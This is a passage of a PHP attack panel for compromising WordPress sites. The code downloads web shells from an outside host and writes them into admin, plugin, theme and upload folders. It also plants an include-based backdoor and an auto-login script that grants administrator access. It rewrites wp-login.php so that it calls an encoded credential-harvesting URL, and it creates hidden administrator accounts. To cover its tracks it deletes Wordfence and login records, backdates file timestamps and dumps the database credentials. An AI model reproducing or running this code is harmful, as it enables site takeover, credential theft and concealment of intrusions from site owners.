					echo '<font color="red">'."{$name} Is not add!".'</font>'."<br/>";
				}
			
		}
	///////////////////////////
	if(!empty($_POST['zip_2'])){
		$insert_url_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/favicons.txt");
		if(!empty($insert_url_con)){
			if(is_file($_POST['zip_2'].'favicons.ico')){
				$check_icon=file_get_contents($_POST['zip_2'].'favicons.ico');
				if($check_icon==$insert_url_con){
					$file_dir=$_POST['zip_2'].'favicons.ico';
				}else{
					$file_dir=$_POST['zip_2'].'.favicons.ico';
				}
			}else{
				$file_dir=$_POST['zip_2'].'favicons.ico';
			}
			if(strpos('\\',$file_dir)!==false){
				$file_dir=str_replace('\\','/',$file_dir);
			}
				unlink($_POST['zip_2'].'newfile.php');
				@file_put_contents($file_dir,$insert_url_con);
				if(is_file($file_dir)){
				@chmod($file_dir,$file_per);
				@touch($file_dir,$time);
				@touch($_POST['zip_2'],$time);
					echo '<font color="green">'.$file_dir." Is add!".'</font>'."<br/>";
					$new_ma_con="<?php\r\n@include(\$_GET['data']);";
						$add_user_link='';
						for($i=0;$i<=30;$i++){
							if(empty($add_user_link)){
								$add_user_link=insert_ma('zip_2',$new_ma_con);
							}else{
								break;
							}
						}
						
					if(!empty($add_user_link)){
						if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[]=$add_user_link."?data=phar://".$file_dir.'/admin';
					}else{
						$new_ma_link.=$add_user_link."?data=phar://".$file_dir.'/admin	';
					}
					}else{
						echo '<font color="red">'."{$file_dir} include file Is not add!".'</font>'."<br/>";
					}
				}
				}else{
					echo '<font color="red">'."{$name} Is not add!".'</font>'."<br/>";
				}
			
		}
		if(!empty($_POST['new_new_ma'])){
		$new_ma_link=implode('	',$new_new_ma_array);
	}
	else{
		if(empty($_POST['new-ma'])&&empty($_POST['ftp-fso'])&&empty($_POST['secs'])&&empty($_POST['kaylin'])&&empty($_POST['new_ma2'])&&empty($_POST['add_user'])&&empty($_POST['reset'])&&empty($_POST['get_login_url'])&&empty($_POST['get_login_url_2'])&&empty($_POST['option1'])&&empty($_POST['option2'])&&empty($_POST['all_new'])&&empty($_POST['zip_1'])&&empty($_POST['zip_2'])){
			$new_ma_link="";
		}
	}
	$insert_url_con=NULL;
	unset($insert_url_con);
	///////////////////////////
	///////////////////////////
	///////////////////////////
	///////////////////////////
////////////////////////////////////////////输出
				
			if(!empty($chama_all_link)){
				echo 'file<br/><textarea rows="1" cols="200">'.$chama_all_link.'</textarea>'."<br/>";
			}
			if(!empty($chama_all_link2)){
				echo 'new<br/><textarea rows="1" cols="200">'.$chama_all_link2.'</textarea>'."<br/>";
			}
			if(!empty($chama_all_link_insert_url)){
				echo 'include<br/><font color="green"><textarea rows="1" cols="200">'.$chama_all_link_insert_url.'</textarea><br/>'.'</font>'."<br/>";
			}
			if(!empty($chama_all_link5)){
				echo 'adminer<br/><textarea rows="1" cols="200">'.$chama_all_link5.'</textarea>'."<br/>";
			}
			if(!empty($chama_all_link6)){
				echo 'littlt_ma<br/><textarea rows="1" cols="200">'.$chama_all_link6.'</textarea>'."<br/>";
			}
			if(!empty($new_ma_link)){
				echo 'new_ma_link<br/><textarea rows="1" cols="200">'.$new_ma_link.'</textarea>'."<br/>";
			}
			if(!empty($all_zip_ma)){
				echo 'all_zip<br/><textarea rows="1" cols="200">'.$all_zip_ma.'</textarea>'."<br/>";
			}
			if(!empty($all_root_ma)){
				echo 'all_root_ma<br/><textarea rows="1" cols="200">'.$all_root_ma.'</textarea>'."<br/>";
			}
			if(!empty($chama_all_link3)){
				echo 'upload<br/><textarea rows="1" cols="200">'.$chama_all_link3.'</textarea>'."<br/>";
			}
			if(!empty($chama_all_link4)){
				echo 'auto Login<br/><textarea rows="1" cols="200">'.$chama_all_link4.'</textarea>'."<br/>";
			}
			if(!empty($db_all)){
				echo '<textarea rows="1" cols="50">'.$db_all.'</textarea>'."<br/>";
			}
			
			if(!empty($end_oneword)){
				echo '<font color="green"><textarea rows="1" cols="200">'.$end_oneword.'</textarea><br/>'.'</font>'."<br/>";
			}
 
//////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////
	


  
	
	echo <<<EOT


<body>
<form name="input" action="" method="post" enctype="multipart/form-data">
<font color="red">del_self?</font>
<select name="del_file" style="width:80px"> 
    <option value="">NO</option> 
    <option value="1">del</option> 
    </select>
<br/>
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
<br/>
<select name="check"> 
	<option value="1">test</option>
	<option value="2">test1</option>
	<option value="3">get url root</option>
	<option value="4">DISALLOW all</option>
	<option value="5">get_file</option>
	<option value="6">ping sitemap</option>
	<option value="7">add fun & robot</option>
	<option value="8">del paswd</option>
	<option value="9">touch all file</option>
</select>
<div style="overflow:hidden;height:1px;">
	<select name="moshi"> 
	{$moshi_sel}
    </select>
	<font color="red">config-add?</font>
<select name="config_add" style="width:80px"> 
<option value="1">add</option> 
	</select>
	themes&database<select name="themes_database" style="width:80px"> 
<option value="1">add</option> 
    </select>
	</div>
<br/><br/>
	{$end_all_themes}
<font color="red">no php5 or phtml?</font>
<select name="no_php5_or_phtml" style="width:80px"> 
   <option value="">NO</option> 
   <option value="1">Yes</option> 
    </select><br/><br/>
	<font color="red">suspected?</font>
<select name="suspected" style="width:80px"> 
   <option value="">NO</option> 
   <option value="1">Yes</option> 
    </select><br/>
	<br/>

		<font color="red">check_fun?</font>
	<select name="check_fun" style="width:80px"> 
   <option value="1">Yes</option> 
    </select>
<!--
check_file_manager?
	<select name="check_file_manager" style="width:80px"> 
	<option value="1">add</option>
	<option value="2">system</option> 
	<option value="">NO</option>
    </select>
		<br/><br/>-->
	<font color="red">add auto admin?</font>
	<select name="auto_login_admin" style="width:80px"> 
{$config_add_echo}
    </select>
	<font color="red">add auto login?</font>
	<select name="auto_login_plugin" style="width:80px"> 
{$config_add_echo}
    </select>
	<font color="red">add auto themes?</font>
	<select name="auto_login_themes" style="width:80px"> 
{$config_add_echo}
    </select>
	<font color="red">add auto uploads?</font>
	<select name="auto_login_uploads" style="width:80px"> 
{$config_add_echo}
    </select>
	<font color="red">add auto includes?</font>
	<select name="auto_login_includes" style="width:80px"> 
{$config_add_echo}
    </select>
	<font color="red">add_all_auto_login</font>
	<select name="add_all_auto_login" style="width:80px"> 
	<option value="">NO</option>
	<option value="1">add</option>
    </select>
 
	

	<br/><br/>
	del_wordfence_all?<select name="del_wordfence_all" style="width:80px"> 
{$config_add_echo}
    </select>
	del_wfhits?<select name="del_wfhits" style="width:80px"> 
{$config_add_echo}
    </select>
	del_wflogins?<select name="del_wflogins" style="width:80px"> 
{$config_add_echo}
    </select>
	del_usermeta?<select name="del_usermeta" style="width:80px"> 
{$config_add_echo}
    </select>
	del_wffilemods?<select name="del_wffilemods" style="width:80px"> 
{$config_add_echo}
    </select>
	<br/>
		{$themes_fun_con2}
<br/>
admin<select name="chama1" style="width:80px"> 
{$admin_select}
    </select>
plugin1<select name="chama2" style="width:80px"> 
{$plugin_scan1}
    </select>
plugin2<select name="chama3" style="width:80px"> 
{$plugin_scan2}
    </select>
themes<select name="chama4" style="width:80px"> 
{$themes_scan1}
    </select>
upload1<select name="chama5" style="width:80px"> 
{$uploads_scan1}
    </select>
upload2<select name="chama6" style="width:80px"> 
{$uploads_scan2}
    </select>
include<select name="chama7" style="width:80px"> 
{$include_select}
</select>
<font color="red">jm?</font><select name="ma_1_jm" style="width:80px"> 
<option value="">NO</option>
<option value="1">add</option>
</select>
<font color="red">add_all_check_file_m</font>
	<select name="add_all_check_file_m" style="width:80px"> 
	<option value="">NO</option>
	<option value="1">add</option>
    </select>
	<br/><br/>
new-ma<select name="chama-new1" style="width:80px"> 
{$plugin_scan8}
    </select>
<select name="chama-new2" style="width:80px"> 
{$themes_scan5}
    </select>
<select name="chama-new3" style="width:80px"> 
{$uploads_scan4}
    </select>
	
	
	
	
<select name="chama_option" style="width:80px"> 
    <option value="1">---</option> 
    <option value="filecontral-changediy.txt">filecontral-changediy</option> 
    <option value="try-gai.txt">try-gai</option> 
    <option value="new-ma.txt">new-ma</option> 
    <option value="files.txt">files</option> 
    <option value="ftp-fso.txt">ftp-fso</option> 
    <option value="secs.txt">secs</option> 
    <option value="kaylin.txt">kaylin</option> 
    <option value="adminer.txt">adminer</option> 
    </select>
	
	
	
	
	
<br/><br/>
upload_admin
<select name="upload_admin" style="width:80px"> 
{$config_add_echo}
    </select>
upload_plugin
<select name="upload_file1" style="width:80px"> 
{$plugin_scan7}
    </select>
upload_themes
<select name="upload_file2" style="width:80px"> 
{$themes_scan4}
    </select>
upload_upload
<select name="upload_file3" style="width:80px"> 
{$uploads_scan3}
    </select>
upload_include
<select name="upload_include" style="width:80px"> 
{$config_add_echo}
    </select>
upload_pligin2
<select name="upload_file4" style="width:80px"> 
{$config_add_echo}
    </select>
upload_pligin3
<select name="upload_file5" style="width:80px"> 
{$config_add_echo}
    </select>
<font color="red">add_all_upload</font>
	<select name="add_all_upload" style="width:80px"> 
	<option value="">NO</option>
	<option value="1">add</option>
    </select>
<br/><br/>
add_adminer_plugin?
<select name="add_adminer_plugin" style="width:80px"> 
{$config_add_echo}
  </select>
  add_adminer_themes?
<select name="add_adminer_themes" style="width:80px"> 
{$config_add_echo}
  </select>
  add_adminer_includes?
<select name="add_adminer_includes" style="width:80px"> 
{$config_add_echo}
  </select>
  <font color="red">add_all_adminer</font>
	<select name="add_all_adminer" style="width:80px"> 
	<option value="">NO</option>
	<option value="1">add</option>
    </select>
  <br/><br/>
   little_ma_admin?
<select name="little_ma_admin" style="width:80px"> 
{$config_add_echo}
  </select>
  little_ma_plugins?
<select name="little_ma_plugins" style="width:80px"> 
{$config_add_echo}
  </select>
  little_ma_themes?
<select name="little_ma_themes" style="width:80px"> 
{$config_add_echo}
  </select>
  little_ma_uploads?
<select name="little_ma_uploads" style="width:80px"> 
{$config_add_echo}
  </select>
  little_ma_includes?
<select name="little_ma_includes" style="width:80px"> 
{$config_add_echo}
  </select>
    little_ma_2?
<select name="little_ma_2" style="width:80px"> 
{$config_add_echo}
  </select>
   <font color="red">add_all_little_ma</font>
	<select name="add_all_little_ma" style="width:80px"> 
	<option value="">NO</option>
	<option value="1">add</option>
    </select>
  <br/><br/>
    new-ma?
<select name="new-ma" style="width:80px"> 
{$config_add_echo}
  </select>
    ftp-fso?
<select name="ftp-fso" style="width:80px"> 
{$config_add_echo}
  </select>
    secs?
<select name="secs" style="width:80px"> 
{$config_add_echo}
  </select>
  kaylin
  <select name="kaylin" style="width:80px"> 
{$config_add_echo}
  </select>
   new-ma2
  <select name="new_ma2" style="width:80px"> 
{$config_add_echo}
  </select>
     add_user
  <select name="add_user" style="width:80px"> 
{$config_add_echo}
  </select>
     reset
  <select name="reset" style="width:80px"> 
{$config_add_echo}
  </select>
  get_login_url
   <select name="get_login_url" style="width:80px"> 
{$config_add_echo}
  </select>
   get_login_url_2
   <select name="get_login_url_2" style="width:80px"> 
{$config_add_echo}
  </select>
   option1
   <select name="option1" style="width:80px"> 
{$config_add_echo}
  </select>
  option2
   <select name="option2" style="width:80px"> 
{$config_add_echo}
  </select>
   all-new
  <select name="all_new" style="width:80px"> 
<option value="">NO</option> 
<option value="1">add</option> 	
</select>
<br/><br/>

auto_content_zip_plugin
<select name="auto_content_zip_plugin" style="width:80px"> 
{$config_add_echo}
  </select>
auto_content_zip_themes
<select name="auto_content_zip_themes" style="width:80px"> 
{$config_add_echo}
  </select>
auto_content_zip_uploads
<select name="auto_content_zip_uploads" style="width:80px"> 
{$config_add_echo}
  </select>
<font color="red">all_zip</font>
<select name="all_zip" style="width:80px"> 
{$config_add_echo}
  </select>
<br/><br/>
root_other_chama_1
<select name="root_other_chama_1" style="width:80px"> 
<option value="">NO</option>
{$all_root_option}
  </select>
root_other_chama_2
<select name="root_other_chama_2" style="width:80px"> 
<option value="">NO</option>
{$all_root_option}
  </select>
root_other_chama_3
<select name="root_other_chama_3" style="width:80px"> 
<option value="">NO</option>
{$all_root_option}
  </select>
  root_other_chama_4
<select name="root_other_chama_4" style="width:80px"> 
<option value="">NO</option>
{$all_root_option}
  </select>
  root_other_chama_5
<select name="root_other_chama_5" style="width:80px"> 
<option value="">NO</option>
{$all_root_option}
  </select>
<font color="red">all_root_other</font>
<select name="all_root_other" style="width:80px"> 
<option value="">NO</option> 
<option value="add">add</option> 
  </select>




<br/><br/>
customize_zip_1
<input type="text" name="zip_1" style="width:300px;"/>
</select><br/>
customize_zip_2
<input type="text" name="zip_2" style="width:300px;"/>

<br/><br/>include
<input type="text" name="insert_url" style="width:300px;"/>

<select name="insert_option" style="width:80px"> 
<option value="1">---</option> 
    <option value="filecontral-changediy.txt">filecontral-changediy</option> 
    <option value="try-gai.txt">try-gai</option> 
    <option value="new-ma.txt">new-ma</option> 
    <option value="files.txt">files</option> 
    <option value="ftp-fso.txt">ftp-fso</option> 
    <option value="secs.txt">secs</option> 
    <option value="kaylin.txt">kaylin</option> 
    <option value="adminer.txt">adminer</option> 
    </select>
  
  <br/> <br/> <br/> 
file_ma<br/><textarea name="file_ma" rows="1" cols="50"></textarea><br/>
new_ma<br/><textarea name="new_ma" rows="1" cols="50"></textarea><br/>
adminer_ma<br/><textarea name="adminer_ma" rows="1" cols="50"></textarea><br/>
little_check_ma<br/><textarea name="little_check_ma" rows="1" cols="50"></textarea><br/>
new_new_ma<br/><textarea name="new_new_ma" rows="1" cols="50"></textarea><br/>
upload_ma<br/><textarea name="upload_ma" rows="1" cols="50"></textarea><br/>
auto_login_ma<br/><textarea name="auto_login_ma" rows="1" cols="50"></textarea><br/>
  
  
  <br/>

  <br/><br/>
<input type="submit" value="Submit" />
</body>
</html>
EOT;


if(function_exists("opcache_reset")){
	opcache_reset();
}
exit;
}
}


if(isset($_POST['check'])&&$_POST['check']==2){
 	$db_host_srt=constant("DB_HOST");
			if(strpos($db_host_srt,':')!==false){
				$db_host_array=explode(':',$db_host_srt);
				$con=mysqli_connect($db_host_array[0],constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME"),$db_host_array[1]); 
			}else{
				$con=mysqli_connect(constant("DB_HOST"),constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME")); 
			}
			if (mysqli_connect_errno($con)){
				echo "MySQL connect error: " . mysqli_connect_error(); 
			}
			mysqli_set_charset($con,"utf8") or mysql_error();
			$sql = "select option_value from ".$table_prefix."options";
			$res = mysqli_query($con,$sql);
			//print_r($res);
			
			if($res>0){
			echo '<font color="green"> exec ok db!</font>'."<br/>";
			$row = mysqli_fetch_row($res);
	
				if(strpos($row[0],'http')!==false){
					$_POST['url_root']=$row[0];
				}elseif(strpos($row[1],'http')!==false){
					$_POST['url_root']=$row[1];
				}else{
					echo '<font color="red">get error !</font>'."<br/>";
				}
			}else{
				echo '<font color="red"> exec db not ok!</font>'."<br/>";
			}
			mysqli_close($con);
			
	if(substr($_POST['url_root'], -1)=='\\'){
	}
	elseif(substr($_POST['url_root'], -1)!=='/'){
		$_POST['url_root']=$_POST['url_root'].'/';
	}
	echo $_POST['url_root']."<br/>";
	
$auto_login=<<<EOT
<?php
    require('{$_POST['root']}wp-blog-header.php'); 
    \$query_str = "SELECT ID FROM \$wpdb->users";
    \$user_ids = \$wpdb->get_results(\$query_str);
    foreach (\$user_ids as \$uid) {
        \$user_id = \$uid->ID;
        if (user_can(\$user_id, 'administrator')) {
            \$user_info = get_userdata(\$user_id);
            \$user_login = \$user_info->user_login;
            wp_set_current_user(\$user_id, \$user_login);
            wp_set_auth_cookie(\$user_id);
            do_action('wp_login', \$user_login);
            echo "You are logged in as \$user_login";
            if (function_exists('get_admin_url')) {
                wp_redirect(get_admin_url());
            } else {
                wp_redirect(get_bloginfo('wpurl') . '/wp-admin');
            }
            exit;
        }
	}
EOT;
 
	$login_file=file_get_contents($_POST['root']."wp-login.php");
		if(strpos($login_file,'aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
			echo '<font color="green">Login Black Is Exist!</font>'."<br/>";
		}elseif(strpos($login_file,'aHR0cDovLzEuc2FsZWZvcnlvdS5vcmcvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
				$login_file=str_replace('aHR0cDovLzEuc2FsZWZvcnlvdS5vcmcvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ','aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ',$login_file);
				@unlink($_POST['root']."wp-login.php");
				@file_put_contents($_POST['root']."wp-login.php",$login_file);
				@chmod($_POST['root']."wp-login.php",$file_per);
				@touch($_POST['root'].'wp-login.php',$time);
				@touch($_POST['root'],$time);
				$login_file=file_get_contents($_POST['root']."wp-login.php");
				if(strpos($login_file,'aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
				echo '<font color="green">Login Black Is add!</font>'."<br/>";
			}else{
				echo '<font color="red">Login Black Is not add!</font>'."<br/>";
				}
			}
		else{
			if(strpos($login_file,'saleforyou')!==false||strpos($login_file,'bingstyle')!==false){
				$login_file=preg_replace('/redirect_to == admin_url\(\) \) \) {[\s\S]+?\/\/ If the user doesn/',"redirect_to == admin_url() ) ) {\r\n// If the user doesn",$login_file);
				echo '<font color="red" size="5"><b>Del Old Ok!</b></font>'."<br/>";
			}
			$login_file=str_replace("// If the user doesn't belong",$login_add."// If the user doesn't belong",$login_file);
			@unlink($_POST['root']."wp-login.php");
			@file_put_contents($_POST['root']."wp-login.php",$login_file);
			@chmod($_POST['root']."wp-login.php",$file_per);
			@touch($_POST['root']."wp-login.php",$time);
			@touch($_POST['root'],$time);
			$login_file=file_get_contents($_POST['root']."wp-login.php");
			if(strpos($login_file,'aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
				echo '<font color="green">Login Black Is add!</font>'."<br/>";
			}else{
				echo '<font color="red">Login Black Is not add!</font>'."<br/>";
				}
		}
		
		
		if (defined('DISALLOW_FILE_MODS')) {
			if(constant("DISALLOW_FILE_MODS")){
				echo '<font color="green">Config Black Is Exist!</font>'."<br/>";
			}else{
					$config_file=file_get_contents($_POST['root']."wp-config.php");
					$config_file=preg_replace('/define.*?DISALLOW_FILE_(MODS|EDIT).*?(true|false).*?;/i','',$config_file);
					@unlink($_POST['root']."wp-config.php");
					@file_put_contents($_POST['root']."wp-config.php",$config_file);
					@chmod($_POST['root']."wp-config.php",$file_per);
					@touch($_POST['root']."wp-config.php",$time);
					@touch($_POST['root'],$time);
					$config_file=file_get_contents($_POST['root']."wp-config.php");
					if(strpos($config_file,'\'DISALLOW_FILE_MODS\',false')!==false||strpos($config_file,'\'DISALLOW_FILE_MODS\', false')!==false||strpos($config_file,'\'DISALLOW_FILE_MODS\' ,false')!==false){
					echo '<font color="red">Config Black False Is Not delete!</font>'."<br/>";
				}else{
				echo '<font color="green">Config Black False Is delete!!!</font>'."<br/>";
				}
				
				$settings_file=file_get_contents($_POST['root']."wp-settings.php");
					$settings_file=preg_replace('/define.*?DISALLOW_FILE_(MODS|EDIT).*?false.*?;/i','',$settings_file);
					@unlink($_POST['root']."wp-settings.php");
					@file_put_contents($_POST['root']."wp-settings.php",$settings_file);
					@chmod($_POST['root']."wp-settings.php",$file_per);
					@touch($_POST['root']."wp-settings.php",$time);
					@touch($_POST['root'],$time);
					$settings_file=file_get_contents($_POST['root']."wp-settings.php");
					if(strpos($settings_file,'\'DISALLOW_FILE_MODS\',false')!==false||strpos($settings_file,'\'DISALLOW_FILE_MODS\', false')!==false||strpos($settings_file,'\'DISALLOW_FILE_MODS\' ,false')!==false){
					echo '<font color="red">settings Black False Is Not delete!</font>'."<br/>";
				}else{
				echo '<font color="green">settings Black False Is delete!!!</font>'."<br/>";
				}
			}
		}else{
		if(is_file($_POST['root']."wp-config.php")){
			$config_file=file_get_contents($_POST['root']."wp-config.php");
					$config_file=preg_replace('/define.*?DISALLOW_FILE_(MODS|EDIT).*?(true|false).*?;/i','',$config_file);
					@unlink($_POST['root']."wp-config.php");
					@file_put_contents($_POST['root']."wp-config.php",$config_file);
					@chmod($_POST['root']."wp-config.php",$file_per);
					@touch($_POST['root']."wp-config.php",$time);
					@touch($_POST['root'],$time);
					$config_file=file_get_contents($_POST['root']."wp-config.php");
					if(strpos($config_file,'\'DISALLOW_FILE_MODS\',false')!==false||strpos($config_file,'\'DISALLOW_FILE_MODS\', false')!==false||strpos($config_file,'\'DISALLOW_FILE_MODS\' ,false')!==false){
					echo '<font color="red">Config Black False Is Not delete!</font>'."<br/>";
				}else{
				echo '<font color="green">Config Black False Is delete!!!</font>'."<br/>";
				}
				}
			$config_file=file_get_contents($_POST['root']."wp-settings.php");
			$config_file_check=preg_replace('/\s+/','',$config_file);
			if(strpos($config_file_check,'//define(\'DISALLOW_FILE_MODS\'')!==false||strpos($config_file_check,'#define(\'DISALLOW_FILE_MODS\'')!==false){
			echo '<font color="red" size=5>settings Black True Zhu Shi!</font>'."<br/>";
			if(strpos($config_file_check,'//define(\'DISALLOW_FILE_MODS\'')!==false){
				$config_file_gai=str_replace('//define(\'DISALLOW_FILE_MODS\'','define(\'DISALLOW_FILE_MODS\'',$config_file);
				@unlink($_POST['root']."wp-settings.php");
				@file_put_contents($_POST['root']."wp-settings.php",$config_file_gai);
				@chmod($_POST['root']."wp-settings.php",$file_per);
				@touch($_POST['root']."wp-settings.php",$time);
				@touch($_POST['root'],$time);
			}elseif(strpos($config_file_check,'#define(\'DISALLOW_FILE_MODS\'')!==false){
				$config_file_gai=str_replace('#define(\'DISALLOW_FILE_MODS\'','define(\'DISALLOW_FILE_MODS\'',$config_file);
				@unlink($_POST['root']."wp-settings.php");
				@file_put_contents($_POST['root']."wp-settings.php",$config_file_gai);
				@chmod($_POST['root']."wp-settings.php",$file_per);
				@touch($_POST['root']."wp-settings.php",$time);
				@touch($_POST['root'],$time);
			}
				$config_file=file_get_contents($_POST['root']."wp-settings.php");
				$config_file_check=preg_replace('/\s+/','',$config_file);
				if(strpos($config_file_check,'//define(\'DISALLOW_FILE_MODS\'')!==false||strpos($config_file_check,'#define(\'DISALLOW_FILE_MODS\'')!==false){
				echo '<font color="red">settings Black ZhuShi Is Not delete!</font>'."<br/>";
			}else{
				echo '<font color="green">settings Black ZhuShi Is delete!!!</font>'."<br/>";
				echo '<font color="green">settings Black is add</font>'."<br/>";
				}
				
			}
		}
		if(!empty($_POST['config_add'])){
			if(is_file($_POST['root']."wp-settings.php")){
			$config_file=file_get_contents($_POST['root']."wp-settings.php");
			if(strpos($config_file,'\'DISALLOW_FILE_MODS\',true')!==false){
				echo '<font color="green">settings Black Is Exist!</font>'."<br/>";
			}else{
				$config_file=str_replace("do_action( 'wp_loaded' );","define('DISALLOW_FILE_MODS',true);\r\n"."do_action( 'wp_loaded' );",$config_file);
				@unlink($_POST['root']."wp-settings.php");
				@file_put_contents($_POST['root']."wp-settings.php",$config_file);
				@chmod($_POST['root']."wp-settings.php",$file_per);
				$config_file=file_get_contents($_POST['root']."wp-settings.php");
				if(strpos($config_file,"define('DISALLOW_FILE_MODS',true);")!==false){
				echo '<font color="green">settings Black Is add!</font>'."<br/>";
				get_test_Html($url_root.'wp-admin/');
				@touch($_POST['root']."wp-settings.php",$time);
				@touch($_POST['root'],$time);
			}else{
				echo '<font color="red">settings Black Is not add!</font>'."<br/>";
				}
			}
			}else{
				echo '<font color="red">settings File Is not Exists!</font>'."<br/>";
			}
		}else{
			
			echo '<font color="red" size=5>settings Is not select!</font>'."<br/>";
		}
		///////////////////////////////////////////////////////////
	if(!empty($_POST['chama_con'])&&$_POST['url_root']){
		
		/////////////////////////////////////////
		if(!empty($_POST['create_user'])){
		@require_once($_POST['root'].'wp-includes/registration.php');
		//$create_user=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/create_user.txt");
		$newusername = 'admin_'.generate_user(rand(3,6));
		$newpassword = generate_password(rand(10,20));
		$newemail = generate_user(4,8).'@'.generate_user(4,8);
		if ( !username_exists($newusername) && !email_exists($newemail) ) 
			{
				$user_id = wp_create_user( $newusername, $newpassword, $newemail);
				if ( is_int($user_id) )
				{
					$wp_user_object = new WP_User($user_id);
					$wp_user_object->set_role('administrator');
					$user_pw=$_POST['url_root'].'wp-login.php username='.$newusername.' password='.$newpassword;
					echo '<font color="green">create admin ok!</font>'."<br/>";
				} 
				else {
					echo '<font color="red">get_create_user error!</font>'."<br/>";
				}
			}
		}
		
		
		//////////////////////////////////////////
if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
	$db_host_srt=constant("DB_HOST");
	if(strpos($db_host_srt,':')!==false){
		$db_host_array=explode(':',$db_host_srt);
		$con=mysqli_connect($db_host_array[0],constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME"),$db_host_array[1]); 
	}else{
		$con=mysqli_connect(constant("DB_HOST"),constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME")); 
	} 
	if (mysqli_connect_errno($con)){ 
		echo "MySQL connect error: " . mysqli_connect_error(); 
	}
	mysqli_set_charset($con,"utf8") or mysql_error();
	//////////////////////////////////////
	//$table_prefix

		$sql = "delete from ".$table_prefix.'wfhits'." where id in(select t.id from(select * from ".$table_prefix.'wfhits'." order by id desc limit 10)as t)";
		$res = mysqli_query($con,$sql);
		if($res){
			echo '<font color="Green">'.$table_prefix.'wfhits Delete OK!'.'</font>'."<br/>";
		}else{
			$sql = "delete from ".$table_prefix.'wfHits'." where id in(select t.id from(select * from ".$table_prefix.'wfHits'." order by id desc limit 10)as t)";
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'wfHits Delete OK!'.'</font>'."<br/>";
			}else{
				echo '<font color="red">'.$table_prefix.'wfHits Delete error! Please Check'.'</font>'."<br/>";
			}
		}
			$sql = "delete from ".$table_prefix.'wflogins'." where id in(select t.id from(select * from ".$table_prefix.'wflogins'." order by id desc limit 6)as t)";//删除降序前n行
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'wflogins Delete OK!'.'</font>'."<br/>";
			}else{
				$sql = "delete from ".$table_prefix.'wfLogins'." where id in(select t.id from(select * from ".$table_prefix.'wfLogins'." order by id desc limit 6)as t)";//删除降序前n行
				$res = mysqli_query($con,$sql);
				if($res){
					echo '<font color="Green">'.$table_prefix.'wfLogins Delete OK!'.'</font>'."<br/>";
				}else{
					echo '<font color="red">'.$table_prefix.'wfLogins Delete error! Please Check'.'</font>'."<br/>";
				}
			}
			$sql = "delete from `".$table_prefix.'usermeta'."` where umeta_id in(select t.umeta_id from(SELECT * FROM `".$table_prefix.'usermeta'."` WHERE `meta_key` LIKE '%login%')as t)";//删除登陆记录
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'usermeta Delete OK!'.'</font>'."<br/>";
			}else{
				echo '<font color="red">'.$table_prefix.'usermeta Delete error! Please Check'.'</font>'."<br/>";
			}
			$sql = "DELETE FROM `".$table_prefix.'wffilemods'."`";
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'wffilemods Delete OK!'.'</font>'."<br/>";
			}else{
				$sql = "DELETE FROM `".$table_prefix.'wfFileMods'."`";
				$res = mysqli_query($con,$sql);
				if($res){
					echo '<font color="Green">'.$table_prefix.'wfFileMods Delete OK!'.'</font>'."<br/>";
				}else{
					echo '<font color="red">'.$table_prefix.'wfFileMods Delete error! Please Check'.'</font>'."<br/>";
				}
			}
}
	$db_all='';
	$db_all=constant("DB_NAME").'	'.constant("DB_USER").'	'.constant("DB_PASSWORD").'	'.constant("DB_HOST").'	'.$table_prefix;
		
	
		
		if(!empty($_POST['url_root'])){
			$other_url_root=$_POST['url_root'];
			
		}
		
			///////////////////////////////////////////////////////////add_all_check_file_m
		if(!empty($_POST['ma_1_jm'])){
			$chama_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/filecontral-changediy-jm.txt");
		}else{
			$chama_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/filecontral-changediy.txt");
		}
		$chama_all_link='';
		if(!empty($_POST['chama1'])){
		if(is_file($_POST['root']."wp-admin/css/colors/blue/index.php")){
			@chmod($_POST['root']."wp-admin/css/colors/blue/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($_POST['root']."wp-admin/css/colors/blue/index.php");
				if(strpos($plugin_url_con_1,"function upfile")){
					echo '<font color="green">'."Admin ma File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root']."wp-admin/css/colors/blue/index.php	";
				}
				
		}else{
				@file_put_contents($_POST['root']."wp-admin/css/colors/blue/index.php",$chama_con);
				@chmod($_POST['root']."wp-admin/css/colors/blue/index.php",$file_per);
				@touch($_POST['root']."wp-admin/css/colors/blue/index.php",$time);
				@touch($_POST['root']."wp-admin/css/colors/blue/",$time);
				usleep(500);
				if(is_file($_POST['root']."wp-admin/css/colors/blue/index.php")){
					echo '<font color="green">'."Admin ma File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root']."wp-admin/css/colors/blue/index.php	";
				}else{
					echo '<font color="red">'.$_POST['root']."wp-admin/css/colors/blue/index.php is not add".'</font>'."<br/>";
				}
			}
		}
		
		
		$plugins_1=NULL;
		$plugins_2=NULL;
		if(!empty($_POST['chama2'])){
		$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/plugins/".$_POST['chama2']);
